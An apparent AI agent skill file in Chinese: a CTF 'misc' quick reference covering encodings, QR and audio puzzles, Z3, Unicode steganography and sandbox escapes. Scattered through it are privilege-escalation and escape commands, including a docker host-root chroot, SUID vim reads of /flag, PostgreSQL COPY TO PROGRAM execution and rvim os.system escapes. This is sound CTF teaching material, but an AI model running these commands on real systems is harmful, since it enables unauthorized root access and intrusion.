---
name: ctf-misc
description: 提供各种杂项 CTF 挑战技巧，适用于不完全符合主要类别的问题。用于编码谜题、pyjails、bash jails、RF/SDR、DNS 异常、unicode 技巧、晦涩语言、二维码或音频谜题、约束求解、博弈论、非常规沙箱逃逸和混合逻辑谜题。当挑战主要涉及 web、pwn、reverse、forensics、malware、OSINT 或 crypto 时，优先选择更具体的技能。将此视为真正跨类别或边缘案例挑战的备用技能，而非默认起点。
license: MIT
compatibility: 需要基于文件系统的代理（如 Claude Code 或类似工具），支持 bash、Python 3，并具备安装工具的网络访问权限。
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch Skill
metadata:
  user-invocable: "false"
---

# CTF 杂项

杂项 CTF 挑战的快速参考。每种技巧这里都有一句话简介；详见支持文件。

## 前置条件

**Python 包（所有平台）：**
```bash
pip install z3-solver pwntools Pillow numpy requests dnslib
```

**Linux（apt）：**
```bash
apt install ffmpeg qrencode
```

**macOS（Homebrew）：**
```bash
brew install ffmpeg qrencode
```

**手动安装：**
- SageMath — Linux: `apt install sagemath`，macOS: `brew install --cask sage`

## 额外资源

- [pyjails.md](pyjails.md) - Python jail/沙箱逃逸技巧，quine 上下文检测，受限字符重复数分解，func_globals 模块链遍历，受限字符集数字生成，类属性持久化，通过存储的 eval 进行 f-string 配置注入
- [bashjails.md](bashjails.md) - Bash jail/受限 shell 逃逸技巧，HISTFILE 文件读取技巧，bash -v 详细模式，ctypes.sh 直接调用 C 库
- [encodings.md](encodings.md) - 编码，二维码，晦涩语言，UTF-16 技巧，BCD 编码，多层自动解码，索引目录二维码重组，多阶段 URL 编码链
- [encodings-advanced.md](encodings-advanced.md) - Verilog/HDL，Gray 码循环编码，RTF 自定义标签提取，SMS PDU 解码，多编码顺序求解器，UTF-9，像素二进制编码，十六进制数独 + 二维码组装，TOPKEK，MaxiCode
- [rf-sdr.md](rf-sdr.md) - RF/SDR/IQ 信号处理（QAM-16，载波恢复，时序同步）
- [dns.md](dns.md) - DNS 利用（ECS 欺骗，NSEC 遍历，IXFR，重绑定，隧道）
- [games-and-vms.md](games-and-vms.md) - WASM 补丁，Roblox 地图文件逆向，PyInstaller，marshal 分析，Python 环境 RCE，Z3（含布尔逻辑门网络 SAT 求解），K8s RBAC，浮点精度利用，通过 Python MRO 链的自定义汇编语言沙箱逃逸
- [games-and-vms-2.md](games-and-vms-2.md) - Cookie 检查点游戏暴力破解，Flask cookie 游戏状态泄露，WebSocket 游戏操控，服务器仅时间验证绕过，De Bruijn 序列，Brainfuck 插桩，WASM 线性内存操控
- [games-and-vms-3.md](games-and-vms-3.md) - memfd_create 打包二进制，多阶段带 HMAC 承诺-揭示和 GF(256) Nim 的加密游戏，模拟器 ROM 切换状态保存，Python marshal 代码注入，Benford 定律绕过，平行连接 oracle 中继，非ogram 求解流水线，100 囚徒问题，C 代码 jail 逃逸通过表情符号标识符，BuildKit 守护进程构建秘密利用，Docker 容器逃逸，Levenshtein 距离 oracle 攻击，通过类型强制绕过污点分析，碎纸文件像素边缘重组
- [games-and-vms-4.md](games-and-vms-4.md) - 第4部分（2018 年代）：XSLT 作为图灵完备虚拟机，JavaScript MAX_SAFE_INTEGER 后继相等性，仅比较 DSL 中的二分查找 oracle，基于脚本引擎超时错误的盲 SQLi，OEIS 序列查找自动化，基于格式字符串约束的二维码重组，矩阵幂计算斐波那契递推，Tribonacci 计算青蛙跳跃计数，Selenium + Tesseract 动态验证码，Brainfuck→Piet 多层多语言，bytebeat 合成代码识别
- [linux-privesc.md](linux-privesc.md) - Sudo 通配符参数注入（fnmatch），精心制作的 pcap 用于 sudoers.d，monit confcheck 进程注入，Apache -d 覆盖，备份 cronjob SUID，PostgreSQL COPY TO PROGRAM RCE，PostgreSQL 备份凭据提取，NFS 共享利用，SSH Unix 套接字隧道，PaperCut 打印部署提权，Squid 代理枢纽，Zabbix 通过 MySQL 重置管理员密码，WinSSHTerm 凭据解密
- [ctfd-navigation.md](ctfd-navigation.md) - 无浏览器访问 CTFd 平台 API：检测、令牌认证、挑战列表、文件下载、flag 提交、排行榜、提示、通知、Python 客户端类

---
## 何时切换方向

- 如果题目实际上是以密码学或数论为中心，切换到 `/ctf-crypto`。
- 如果挑战是真正的二进制利用，而不是沙箱、玩具虚拟机或编码问题，切换到 `/ctf-pwn` 或 `/ctf-reverse`。
- 如果输入主要是文件、图片、音频或需要先恢复的抓包，切换到 `/ctf-forensics`。
- 对于 ML/AI 技术（模型攻击、对抗样本、大语言模型越狱），请参见 `/ctf-ai-ml`。

## 快速启动命令

```bash
# 文件识别
file mystery_file
xxd mystery_file | head -5
python3 -c "import magic; print(magic.from_file('mystery_file'))"

# 编码检测
python3 -c "import base64; print(base64.b64decode('<data>'))"
echo '<data>' | base64 -d
echo '<hex>' | xxd -r -p

# 二维码
zbarimg qr.png
python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('qr.png')))"

# Z3 约束求解
python3 -c "from z3 import *; x=BitVec('x',32); s=Solver(); s.add(x^0xdead==0xbeef); s.check(); print(s.model())"

# Python 沙箱测试
python3 -c "__import__('os').system('id')"
```

## 通用技巧

- 仔细阅读所有提供的文件
- 检查文件元数据、隐藏内容、编码
- Power Automate 脚本可能隐藏 API 调用
- 猜测多个答案时使用二分法

## 常见编码

```bash
# Base64
echo "encoded" | base64 -d

# Base32 (A-Z2-7=)
echo "OBUWG32D..." | base32 -d

# 十六进制
echo "68656c6c6f" | xxd -r -p

# ROT13
echo "uryyb" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

**按字符集识别：**
- Base64: `A-Za-z0-9+/=`
- Base32: `A-Z2-7=`（无小写）
- 十六进制: `0-9a-fA-F`

详见 [encodings.md](encodings.md) 中的凯撒密码暴力破解、URL 编码及完整细节。

## IEEE-754 浮点编码（数据隐藏）

**模式（浮点）：** 数字是隐藏原始字节的 float32 值。

**关键点：** 32 位浮点数就是 4 个字节作为数字解释。重新解释为原始字节 -> ASCII。

```python
import struct
floats = [1.234e5, -3.456e-7, ...]  # 按挑战给定
flag = b''
for f in floats:
    flag += struct.pack('>f', f)
print(flag.decode())
```

**变体：** 双精度 `'>d'`，小端 `'<f'`，混合。详见 [encodings.md](encodings.md) 中的 CyberChef 配方。

## USB 鼠标 PCAP 重构

**模式（逐点捕捉）：** USB HID 鼠标流量捕获屏幕键盘输入。使用 USB-Mouse-Pcap-Visualizer，提取点击坐标（下降沿），累加相对增量得绝对位置，叠加在屏幕键盘图像上。

## 文件类型检测

```bash
file unknown_file
xxd unknown_file | head
binwalk unknown_file
```

## 压缩包解压

```bash
7z x archive.7z           # 通用
tar -xzf archive.tar.gz   # Gzip
tar -xjf archive.tar.bz2  # Bzip2
tar -xJf archive.tar.xz   # XZ
```

### 嵌套压缩包脚本
```bash
while f=$(ls *.tar* *.gz *.bz2 *.xz *.zip *.7z 2>/dev/null|head -1) && [ -n "$f" ]; do
    7z x -y "$f" && rm "$f"
done
```

## 二维码

```bash
zbarimg qrcode.png       # 解码
qrencode -o out.png "data"
```

**MaxiCode 条码：** 六角形二维条码，中心有靶心；标准二维码解码器无法识别，使用 `zxing`（Java）解码。详见 [encodings-advanced.md](encodings-advanced.md#maxicode-2d-条码解码csaw-ctf-2016)。

**TOPKEK 编码：** CTF 特定二进制编码，`KEK=0`，`TOP=1`，`!` 后缀表示重复次数。详见 [encodings-advanced.md](encodings-advanced.md#topkek-二进制编码hack-the-vote-2016)。

详见 [encodings.md](encodings.md) 中的二维码结构、修复技巧、分块重组（结构化和索引目录变体）及多阶段 URL 编码链。
## Audio Challenges

```bash
sox audio.wav -n spectrogram  # 可视化数据
qsstv                          # SSTV 解码器
```

## RF / SDR / IQ 信号处理

详见 [rf-sdr.md](rf-sdr.md)（IQ 格式，QAM-16 解调，载波/时序恢复）。

**快速参考：**
- **cf32**: `np.fromfile(path, dtype=np.complex64)` | **cs16**: int16 reshape(-1,2) | **cu8**: RTL-SDR 原始数据
- 星座图中的圆圈 = 恒定频偏；螺旋 = 频率漂移 + 增益不稳定
- 差分解调载波恢复存在 4 倍歧义 - 尝试 0/90/180/270 度旋转

## pwntools 交互

```python
from pwn import *

r = remote('host', port)
r.recvuntil(b'prompt: ')
r.sendline(b'answer')
r.interactive()
```

## Python Jail 快速参考

- **Oracle 模式：** `L()` = 长度，`Q(i,x)` = 比较，`S(guess)` = 提交。线性或二分搜索。
- **Walrus 绕过：** `(abcdef := "new_chars")` 重新赋值约束变量
- **装饰器绕过：** `@__import__` + `@func.__class__.__dict__[__name__.__name__].__get__` 实现无调用、无引号绕过
- **字符串拼接：** `open(''.join(['fl','ag.txt'])).read()` 当 `+` 被禁止时使用

详见 [pyjails.md](pyjails.md) 获取完整技巧。

## Z3 / 约束求解

```python
from z3 import *
flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
# 添加约束，检查可满足性，提取模型
```

详见 [games-and-vms.md](games-and-vms.md) 获取 YARA 规则、类型系统约束、布尔逻辑门网络 SAT 求解。

## 哈希识别

MD5: `0x67452301` | SHA-256: `0x6a09e667` | MurmurHash64A: `0xC6A4A7935BD1E995`

## SHA-256 长度扩展攻击

MAC = `SHA-256(SECRET || msg)`，已知 msg/hash -> 通过 `hlextend` 伪造有效 MAC。易受攻击：SHA-256、MD5、SHA-1。非易受攻击：HMAC、SHA-3。

```python
import hlextend
sha = hlextend.new('sha256')
new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
```

## 技巧快速参考

- **PyInstaller:** `pyinstxtractor.py packed.exe`。详见 [games-and-vms.md](games-and-vms.md) 了解操作码重映射。
- **Marshal:** `marshal.load(f)` 后 `dis.dis(code)`。详见 [games-and-vms.md](games-and-vms.md)。
- **Python 环境 RCE:** `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER="cmd"`。详见 [games-and-vms.md](games-and-vms.md)。
- **WASM 补丁:** `wasm2wat` -> 翻转极小极大值 -> `wat2wasm`。详见 [games-and-vms.md](games-and-vms.md)。
- **浮点精度:** 大乘数放大浮点误差成可利用分数。详见 [games-and-vms.md](games-and-vms.md)。
- **K8s RBAC 绕过:** SA 令牌 -> 冒充 -> hostPath 挂载 -> 读取密钥。详见 [games-and-vms.md](games-and-vms.md)。
- **Cookie 检查点:** 猜测前保存会话 cookie，失败时恢复，避免重置暴力破解。详见 [games-and-vms-2.md](games-and-vms-2.md)。
- **Flask cookie 游戏状态:** `flask-unsign -d -c '<cookie>'` 解码未签名 Flask 会话，泄露游戏答案。详见 [games-and-vms-2.md](games-and-vms-2.md)。
- **WebSocket 传送:** 在控制台修改 `player.x`/`player.y`，调用验证函数。详见 [games-and-vms-2.md](games-and-vms-2.md)。
- **仅时间验证:** 启动会话，`time.sleep(所需秒数)`，提交胜利。详见 [games-and-vms-2.md](games-and-vms-2.md)。
- **Quine 上下文检测:** 双重用途 quine，打印自身（通过验证），仅在服务器进程通过 globals 门运行 payload。详见 [pyjails.md](pyjails.md)。
- **Repunit 分解:** 将目标整数分解为 repunit（1，11，111，...）之和，仅用两个字符（`1` 和 `+`）进行受限 eval。详见 [pyjails.md](pyjails.md)。
- **De Bruijn 序列:** B(k, n) 包含所有 k^n 个长度为 n 的字符串作为子串；通过附加前 n-1 个字符线性化。详见 [games-and-vms-2.md](games-and-vms-2.md)。
- **Brainfuck 插桩:** 插桩 BF 解释器跟踪带子单元，通过验证单元逐字符暴力破解 flag。详见 [games-and-vms-2.md](games-and-vms-2.md)。
- **WASM 内存操作:** 运行时补丁 WASM 线性内存，直接设置游戏状态变量，绕过游戏逻辑。详见 [games-and-vms-2.md](games-and-vms-2.md)。
- **Lua 沙箱逃逸:** 通过 `os["execute"]` 表索引或 `loadstring` 别名绕过 `load()`/`os.execute()` 过滤。详见 [games-and-vms.md](games-and-vms.md#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016)。
- **C 代码 Jail 通过表情符号 + gadget 嵌入逃逸:** 当 C 代码仅允许表情符号和标点时，使用 `(😃==😃)` 作为常数 1，构建整数，在 `add eax, imm32` 常数中嵌入 gadget，跳转到偏移+1 实现 shellcode 原语。详见 [games-and-vms-3.md](games-and-vms-3.md#c代码沙箱逃逸通过emoji标识符和gadget嵌入-midnight-flag-2026)。
- **模拟器 ROM 切换:** `/load` 替换 ROM 但保留 CPU 状态（寄存器、RAM、PC）。在特定 PC 切换 ROM，将一个 ROM 的 INIT 与另一个的显示指令结合 → 读取受保护内存。详见 [games-and-vms-3.md](games-and-vms-3.md#emulator-rom-switching-state-preservation-bsidessf-2026)。
- **BuildKit 守护进程利用:** 暴露的 BuildKit gRPC 允许嵌套 `buildctl build` 使用 `--mount=type=secret` 读取构建密钥。两阶段 Dockerfile：安装 buildctl → 提交挂载 flag 密钥的嵌套构建。详见 [games-and-vms-3.md](games-and-vms-3.md#buildkit-守护进程利用以获取构建秘密bsidessf-2026)。
- **Docker 容器逃逸:** 通过主机设备挂载、docker.sock 套接字逃逸、CAP_SYS_ADMIN cgroup release_agent、通过 /proc 和 overlayfs 泄露容器信息实现特权突破。详见 [games-and-vms-3.md](games-and-vms-3.md#docker-容器逃逸技术)。
- **通过类型强制绕过污点分析:** 在带有保密/污点系统的自定义 ML 类语言中，if 表达式的保密性取决于返回类型而非条件 — 强制副作用函数为私有类型，通过公共可变引用泄露私有数据。详见 [games-and-vms-3.md](games-and-vms-3.md#通过类型强制绕过自定义语言中的污点分析plaidctf-2018)。
- **碎纸文件像素边缘重组:** 将每条碎纸的左右边缘编码为二进制掩码（暗=1），使用 XOR + popcount 汉明距离贪心排列碎纸，实现亚秒级重组。详见 [games-and-vms-3.md](games-and-vms-3.md#在时间压力下通过像素边缘重组碎纸文档nuit-du-hack-ctf-2018)。
- **通过存储 eval 的 f-string 配置注入:** 将 payload 存为配置值，创建名为 `eval(stored_key)` 的键 — f-string 渲染时计算键名表达式，触发 RCE。详见 [pyjails.md](pyjails.md#python-f-string-配置注入通过存储的-eval-inshack-2018)。
- **十六进制数独 + QR 组装:** 4 个 QR 码编码 16x16 十六进制数独象限；解出网格，读取对角线为十六进制对 → ASCII flag。详见 [encodings-advanced.md](encodings-advanced.md#十六进制数独--qr-组装bsidessf-2026)。
- **Z3 布尔门网络 SAT 求解：** 产品密钥验证作为 250 个布尔门（AND/OR/XOR/NOT）作用于 125 个输入位。将每个门建模为 Z3 约束，要求所有输出为 True，毫秒级求解。详见 [games-and-vms.md](games-and-vms.md#z3-sat-求解布尔逻辑门网络bsidessf-2026)。

## 3D 打印机视频喷嘴追踪 (LACTF 2026)

**题型（flag-irl）：** 3D 打印机打印铭牌的视频。flag 是打印出的文字。

**技术：** 从视频帧中追踪喷嘴的 X/Y 位置，过滤打印移动（仅顶层/文字层），绘制二维直方图以显现字母形状：
```python
# 1. 确定文字层帧（例如，帧 26100-28350）
# 2. 追踪打印头 X 位置（物理 X 轴）
# 3. 追踪打印床 X 位置（摄像机角度下的物理 Y 轴）
# 4. 过滤带挤出动作的移动（打印时头部移动）
# 5. 绘制二维散点图/直方图 -> 字母显现
```

## Discord API 枚举 (0xFun 2026)

flag 隐藏在 Discord 元数据中（角色、动态表情、嵌入内容）。调用 `/ctf-osint` 获取 Discord API 枚举技术和代码（详见 ctf-osint 中的 social-media.md）。

---

## SUID 二进制利用 (0xFun 2026)

```bash
# 查找 SUID 二进制文件
find / -perm -4000 2>/dev/null

# 与 GTFObins 交叉参考
# 带 SUID 的 xxd：xxd flag.txt | xxd -r
# 带 SUID 的 vim：vim -c ':!cat /flag.txt'
```

**参考：** https://gtfobins.github.io/

---

## Linux 权限提升快速检查

```bash
# GECOS 字段密码
cat /etc/passwd  # 检查第 5 个冒号分隔字段

# ACL 权限
getfacl /path/to/restricted/file

# Sudo 权限
sudo -l

# Docker 组成员（瞬间 root）
id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

## Docker 组权限提升 (H7CTF 2025)

属于 `docker` 组的用户可以将宿主机文件系统挂载到容器中，并 chroot 进入以获得 root 权限。

```bash
# 检查组成员
id  # 查看 groups 中是否有 "docker"

# 挂载宿主机根文件系统并 chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh

# 现在以宿主机 root 身份运行
cat /root/flag.txt
```

**关键洞察：** Docker 组成员权限等同于 root 权限。`docker` CLI 套接字（`/var/run/docker.sock`）允许创建特权容器，挂载整个宿主机文件系统。

**参考：** https://gtfobins.github.io/gtfobins/docker/

## Sudo 通配符参数注入 (Dump HTB)

Sudo 的 `fnmatch()` 会跨参数边界匹配 `*`。向受限命令注入额外标志（`-Z root`、`-r`、第二个 `-w`）。构造带有效 sudoers 条目的 pcap —— sudo 的解析器能从二进制垃圾中恢复，区别于 cron 的严格解析器。详见 [linux-privesc.md](linux-privesc.md#通过-fnmatch-的-sudo-通配符参数注入-dump-htb)。

## Monit 进程命令行注入 (Zero HTB)

root 权限的 monit 脚本使用 `pgrep -lfa` 提取进程命令行，然后执行修改后的版本。通过 `perl -e '$0 = "..."'` 创建带注入标志的伪造进程。Apache 的 `-d` 参数最后生效覆盖 ServerRoot；`-E` 捕获错误输出。`Include /root/flag` 导致解析错误，泄露文件内容。详见 [linux-privesc.md](linux-privesc.md#monit-confcheck-进程命令行注入zero-htb)。

## PostgreSQL RCE 和文件读取 (Slonik HTB)

`COPY (SELECT '') TO PROGRAM 'cmd'` 以 postgres 用户执行操作系统命令。`pg_read_file('/path')` 读取文件。从 `pg_basebackup` 归档中提取凭据（`global/1260` 即 `pg_authid`）。通过 SSH 隧道连接 Unix 套接字：`ssh -fNL 25432:/var/run/postgresql/.s.PGSQL.5432`。详见 [linux-privesc.md](linux-privesc.md#postgresql-copy-to-program-rceslonik-htb)。
## Backup Cronjob SUID Abuse (Slonik HTB)

Root cronjob 复制目录时会保留 SUID 位，但所有权变为 root。将带 SUID 的 bash 放入源目录 → 备份时会复制为 root 拥有的 SUID。使用 `bash -p` 执行。详见 [linux-privesc.md](linux-privesc.md#备份-cronjob-suid-滥用slonik-htb)。

## PaperCut Print Deploy Privesc (Bamboo HTB)

Root 进程从用户拥有的目录运行脚本。修改 `server-command`，通过 Mobility Print API 刷新触发。详见 [linux-privesc.md](linux-privesc.md#papercut-打印部署权限提升bamboo-htb)。

---

## CTFd Platform Navigation (No Browser)

检测 CTFd (`curl -s "$CTF_URL/api/v1/" | head -5`) 并通过 API 交互。**需要用户提供他们的 API token**（CTFd 设置 > 访问令牌）— 默认不提供。然后对所有请求使用 `Authorization: Token $CTF_TOKEN` 头。

```bash
export CTF_URL="https://ctf.example.com" CTF_TOKEN="ctfd_your_token_here"
curl -s -H "Authorization: Token $CTF_TOKEN" "$CTF_URL/api/v1/challenges" | jq -r '.data[] | "\(.id)\t\(.value)pts\t\(.category)\t\(.name)"'
curl -s -X POST -H "Authorization: Token $CTF_TOKEN" -H "Content-Type: application/json" "$CTF_URL/api/v1/challenges/attempt" -d "{\"challenge_id\": $CID, \"submission\": \"flag{...}\"}"
```

完整流程、Python 客户端类、会话登录、提示、通知、文件下载及故障排除见 [ctfd-navigation.md](ctfd-navigation.md)。

---

## Useful One-Liners

```bash
grep -rn "flag{" .
strings file | grep -i flag
python3 -c "print(int('deadbeef', 16))"
```

## Keyboard Shift Cipher

**模式（Frenzy）：** 字符在 QWERTY 键盘布局上左右偏移。

**识别：** dCode Cipher Identifier 建议为“Keyboard Shift Cipher”

**解码：** 使用 [dCode Keyboard Shift Cipher](https://www.dcode.fr/keyboard-shift-cipher) 的自动模式。

## Pigpen / Masonic Cipher

**模式（Working For Peanuts）：** 基于网格位置的几何符号代表字母。

**识别：** 角度/几何符号，挑战引用“Peanuts”漫画（查理布朗），“尘封的加密”

**解码：** 将符号映射到 Pigpen 网格位置，或使用在线解码器。

## ASCII in Numeric Data Columns

**模式（Cooked Books）：** CSV/电子表格中的数字值（48-126）是 ASCII 字符码。

```python
import csv
with open('data.csv') as f:
    reader = csv.DictReader(f)
    flag = ''.join(chr(int(row['Times Borrowed'])) for row in reader)
print(flag)
```

**CyberChef：** 使用“From Decimal”配方，换行符作为分隔符。

## Backdoor Detection in Source Code

**模式（Rear Hatch）：** 隐藏的命令前缀触发 `system()` 调用。

**常见模式：**
- `strncmp(input, "exec:", 5)` -> 运行 `system(input + 5)`
- 十六进制编码的比较字符串：`\x65\x78\x65\x63\x3a` = "exec:"
- 维护/管理函数中的隐藏条件

## DNS Exploitation Techniques

详见 [dns.md](dns.md)（ECS 欺骗、NSEC 遍历、IXFR、重绑定、隧道技术）。

**快速参考：**
- **ECS 欺骗**：`dig @server flag.example.com TXT +subnet=10.13.37.1/24` - 尝试 leet-speak IP（1337）
- **NSEC 遍历**：跟踪 NSEC 链枚举 DNSSEC 区域
- **IXFR**：当 AXFR 被阻止时使用 `dig @server domain IXFR=0`
- **DNS 重绑定**：低 TTL 交替解析绕过同源策略
- **DNS 隧道**：通过子域查询或 TXT 响应进行数据外泄

## Unicode Steganography

### Variation Selectors Supplement (U+E0100-U+E01EF)
**模式（Seen & emoji, Nullcon 2026）：** 隐形的 Variation Selector Supplement 字符通过码点偏移编码 ASCII。

```python
# 从可见字符后的变体选择器中提取隐藏数据
data = open('README.md', 'r').read().strip()
hidden = data[1:]  # 跳过可见的 emoji 字符
flag = ''.join(chr((ord(c) - 0xE0100) + 16) for c in hidden)
```

**检测：** 字符看似不可见但长度非零。用 `[hex(ord(c)) for c in text]` 检查 —— 查找码点在 `0xE0100-0xE01EF` 或 `0xFE00-0xFE0F` 范围内。
### Unicode Tags Block (U+E0000-U+E007F) (UTCTF 2026)

**模式（隐形于明处）：** 在 URL、文件名或文本中嵌入不可见的 Unicode Tag 字符。每个 tag 码点通过减去 `0xE0000` 直接映射到一个 ASCII 字符。URL 编码为 4 字节 UTF-8 序列（`%F3%A0%81%...`）。

```python
import urllib.parse

url = "https://example.com/page#Title%20%F3%A0%81%B5%F3%A0%81%B4...Visible%20Text"
decoded = urllib.parse.unquote(urllib.parse.urlparse(url).fragment)

flag = ''.join(
    chr(ord(ch) - 0xE0000)
    for ch in decoded
    if 0xE0000 <= ord(ch) <= 0xE007F
)
print(flag)
```

**关键洞察：** Unicode Tags（U+E0001-U+E007F）与 ASCII 1:1 对应——减去 `0xE0000` 即可还原原始字符。它们在大多数字体中呈现为零宽不可见字形。与变体选择器（U+E0100 及以上）不同，这些字符偏移计算更简单，常出现在 URL 片段、挑战标题或文件名中，文本看似正常但字节长度异常长。

**检测方法：** 文本或 URL 的字节长度超出预期。百分号编码序列以 `%F3%A0%80` 或 `%F3%A0%81` 开头。Python 判断示例：`any(0xE0000 <= ord(c) <= 0xE007F for c in text)`。

## UTF-16 字节序反转

**模式（字节序）：** 文本“变成日文”——UTF-16 字节序不匹配导致的乱码。

```python
# 如果编码为 UTF-16-LE 但解码为 UTF-16-BE：
fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
```

**识别方法：** 出现 CJK 字符，挑战提及“翻译”或“字节序”。详见 [encodings.md](encodings.md)。

## 密码识别流程

1. **ROT13** - 挑战提及“ROT”，文本看似乱码英文
2. **Base64** - `A-Za-z0-9+/=`，标题提示“64”
3. **Base32** - 仅大写 `A-Z2-7=` 
4. **Atbash** - 标题提示（Abash/Atbash），保留空格，1:1 替换
5. **Pigpen** - 网格上的几何符号
6. **键盘偏移** - 文本看似相邻键被按下
7. **替换密码** - 可用频率分析

**自动识别工具：** [dCode Cipher Identifier](https://www.dcode.fr/cipher-identifier)

## HISTFILE 技巧绕过受限 Shell 文件读取（BCTF 2016）

无需 cat/less/head 读取文件：`HISTFILE=/flag /bin/bash && history`，或 `bash -v flag.txt`（详细模式打印行），或使用 `ctypes.sh` 的 `dlcall` 直接调用 C 库。详见 [bashjails.md](bashjails.md#histfile-技巧用于受限-shell-文件读取-bctf-2016)。

## Levenshtein 距离 Oracle 攻击（SunshineCTF 2016）

Oracle 返回猜测与秘密的编辑距离。通过空字符串确定长度，单字符重复确定存在字符，二分搜索确定位置。查询复杂度 O(n log n)。详见 [games-and-vms-3.md](games-and-vms-3.md#levenshtein-距离-oracle-攻击sunshinectf-2016)。

## SECCOMP 高位文件描述符绕过（33C3 CTF 2016）

`close(0x8000000000000002)` 通过 64 位 SECCOMP 检查（不等于 2），但内核截断为 32 位（等于 2），关闭了 fd 2。随后 `open()` 返回 fd 2，打开任意文件。BPF 过滤器与内核间的类型宽度不匹配。详见 [games-and-vms-3.md](games-and-vms-3.md#通过高位文件描述符技巧绕过-seccomp33c3-ctf-2016)。

## rvim 通过 Python3 越狱（BKP 2017）

`rvim` 阻止 `:!` 命令，但 `:python3 import os; os.system("cmd")` 可执行任意命令。检查 `:version` 是否包含 `+python3`/`+lua`/`+ruby`。详见 [games-and-vms-3.md](games-and-vms-3.md#通过带-python3-执行的自定义-vimrc-逃逸-rvim-沙箱bkp-2017)。
